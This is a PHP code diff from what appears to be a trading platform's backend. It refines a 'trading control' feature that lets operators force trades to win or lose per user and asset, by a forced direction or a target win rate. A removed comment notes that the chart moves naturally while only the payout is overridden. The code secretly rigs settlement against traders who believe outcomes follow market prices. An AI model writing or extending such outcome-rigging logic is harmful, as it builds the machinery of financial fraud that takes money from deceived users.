@@ -80,8 +80,10 @@ function get_active_trading_control(int $userId, int $assetId): ?array
                AND (asset_id IS NULL OR asset_id = ?)
                AND (user_id IS NULL OR user_id = ?)
              ORDER BY
+               (asset_id IS NOT NULL AND user_id IS NOT NULL) DESC,
+               (user_id IS NOT NULL) DESC,
                (asset_id IS NOT NULL) DESC,
-               (user_id IS NOT NULL) DESC
+               id DESC
              LIMIT 1"
         );
         $stmt->execute([$assetId, $userId]);
@@ -150,16 +152,21 @@ function settle_open_trades(int $userId): int
             $status = null;
             $control = get_active_trading_control($userId, (int)$trade['asset_id']);
             if ($control !== null) {
-                // Direction override takes priority
                 $forcedDir = (string)($control['direction'] ?? 'none');
                 $winRate = isset($control['win_rate']) && $control['win_rate'] !== null
                     ? max(0.0, min(100.0, (float)$control['win_rate']))
                     : null;
 
                 if (in_array($forcedDir, ['up', 'down'], true)) {
-                    // The chart price moves naturally; only the payout is overridden.
-                    $isWin = $trade['direction'] === $forcedDir;
-                    $status = $isWin ? 'won' : 'lost';
+                    $isMatchingDir = $trade['direction'] === $forcedDir;
+                    if ($winRate !== null) {
+                        $effectiveRate = $isMatchingDir ? $winRate : max(0.0, 100.0 - $winRate);
+                        $seed = crc32((string)$tradeId . ':' . $userId . ':wctrl');
+                        $normalised = ($seed < 0 ? ($seed + 4294967296) : $seed) / 4294967295.0;
+                        $status = ($normalised * 100.0 < $effectiveRate) ? 'won' : 'lost';
+                    } else {
+                        $status = $isMatchingDir ? 'won' : 'lost';
+                    }
                 } elseif ($winRate !== null) {
                     // Deterministic per-trade seeding so reruns are idempotent.
                     $seed = crc32((string)$tradeId . ':' . $userId . ':wctrl');
